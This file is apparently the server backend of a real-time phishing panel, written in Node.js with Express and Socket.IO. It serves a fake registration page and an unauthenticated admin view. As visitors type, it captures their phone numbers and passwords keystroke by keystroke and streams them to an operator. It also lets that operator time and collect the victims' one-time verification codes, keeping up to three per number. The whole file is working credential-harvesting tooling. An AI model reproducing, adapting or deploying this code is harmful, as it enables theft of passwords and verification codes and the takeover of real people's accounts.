const express = require('express');
const http = require('http');
const path = require('path');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(__dirname));

const sessions = new Map();
const codesByPhone = new Map();

function getOrCreateSession(sessionId) {
  if (!sessions.has(sessionId)) {
    sessions.set(sessionId, {
      sessionId,
      phone: '',
      password: '',
      typingStarted: false,
      codeRequested: false,
      codeSended: false,
      updatedAt: Date.now()
    });
  }
  return sessions.get(sessionId);
}

function getSubmissionsPayload() {
  const liveSessions = Array.from(sessions.values())
    .filter(
      item =>
        item.phone.length > 0 ||
        item.typingStarted ||
        item.codeRequested ||
        item.codeSended
    )
    .sort((a, b) => b.updatedAt - a.updatedAt);

  const groupedCodes = {};
  for (const [phone, list] of codesByPhone.entries()) {
    groupedCodes[phone] = list;
  }

  return {
    sessions: liveSessions,
    groupedCodes
  };
}

function emitLiveState() {
  io.emit('submissions:update', getSubmissionsPayload());
}

io.on('connection', (socket) => {
  socket.emit('submissions:update', getSubmissionsPayload());

  socket.on('register:start', ({ sessionId, phone, startedAt } = {}) => {
    if (!sessionId) return;

    const cleanPhone = String(phone || '').replace(/\D/g, '').slice(0, 10);
    const entry = getOrCreateSession(sessionId);
    const isFirstStart = !entry.typingStarted;

    entry.typingStarted = true;
    if (cleanPhone && !entry.phone) {
      entry.phone = cleanPhone;
    }
    entry.updatedAt = Date.now();

    if (isFirstStart) {
      io.emit('user:started-registering', {
        sessionId,
        phone: entry.phone || cleanPhone,
        startedAt: startedAt || Date.now()
      });
    }

    emitLiveState();
  });
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'registration.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

app.post('/api/live-update', (req, res) => {
  const { sessionId, phone, password, startedTyping } = req.body;
  if (!sessionId) return res.status(400).json({ error: 'sessionId required' });

  const cleanPhone = String(phone || '').replace(/\D/g, '').slice(0, 10);
  const entry = getOrCreateSession(sessionId);
  const wasFirstKeystroke =
    !entry.typingStarted && (cleanPhone.length > 0 || Boolean(startedTyping));

  if (entry.phone !== cleanPhone) {
    entry.codeSended = false;
  }

  if (cleanPhone.length > 0 || startedTyping) {
    entry.typingStarted = true;
  }

  entry.phone = cleanPhone;
  if (typeof password === 'string') entry.password = password;
  entry.updatedAt = Date.now();

  if (wasFirstKeystroke) {
    io.emit('user:started-registering', {
      sessionId,
      phone: cleanPhone,
      startedAt: Date.now()
    });
  }

  emitLiveState();
  res.json({ ok: true });
});

app.post('/api/request-code', (req, res) => {
  const { sessionId, phone } = req.body;
  if (!sessionId) return res.status(400).json({ error: 'sessionId required' });

  const entry = getOrCreateSession(sessionId);
  if (phone !== undefined) {
    entry.phone = String(phone).replace(/\D/g, '').slice(0, 10);
  }
  entry.typingStarted = true;
  entry.codeRequested = true;
  entry.codeSended = false;
  entry.updatedAt = Date.now();

  emitLiveState();
  res.json({ ok: true });
});

app.get('/api/status', (req, res) => {
  const { sessionId } = req.query;
  if (!sessionId || !sessions.has(sessionId)) {
    return res.json({ codeSended: false });
  }
  const entry = sessions.get(sessionId);
  const justSent = Boolean(entry.codeSended);

  if (justSent) {
    entry.codeSended = false;
    emitLiveState();
  }

  res.json({ codeSended: justSent });
});

app.post('/api/admin/mark-code-sended', (req, res) => {
  const { sessionId } = req.body;
  if (!sessionId || !sessions.has(sessionId)) {
    return res.status(404).json({ error: 'Session not found' });
  }

  const entry = sessions.get(sessionId);
  entry.codeSended = true;
  entry.codeRequested = false;
  entry.updatedAt = Date.now();

  emitLiveState();
  res.json({ ok: true });
});

app.post('/api/submit-code', (req, res) => {
  const { sessionId, phone, code, attempt } = req.body;
  let cleanPhone = String(phone || '').replace(/\D/g, '').slice(0, 10);
  const cleanCode = String(code || '').replace(/\D/g, '').slice(0, 4);

  if (sessionId && sessions.has(sessionId)) {
    const entry = sessions.get(sessionId);
    if (cleanPhone) {
      entry.phone = cleanPhone;
    } else if (entry.phone) {
      cleanPhone = entry.phone;
    }
    entry.typingStarted = true;
    entry.updatedAt = Date.now();
  }

  if (cleanPhone && cleanCode) {
    if (!codesByPhone.has(cleanPhone)) {
      codesByPhone.set(cleanPhone, [null, null, null]);
    }
    const list = codesByPhone.get(cleanPhone);
    const slotIndex = Math.min(Math.max((Number(attempt) || 1) - 1, 0), 2);
    list[slotIndex] = cleanCode;
  }

  emitLiveState();
  res.json({ ok: true });
});

app.get('/api/submissions', (req, res) => {
  res.json(getSubmissionsPayload());
});

app.delete('/api/sessions/:sessionId', (req, res) => {
  sessions.delete(req.params.sessionId);
  emitLiveState();
  res.json({ ok: true });
});

server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});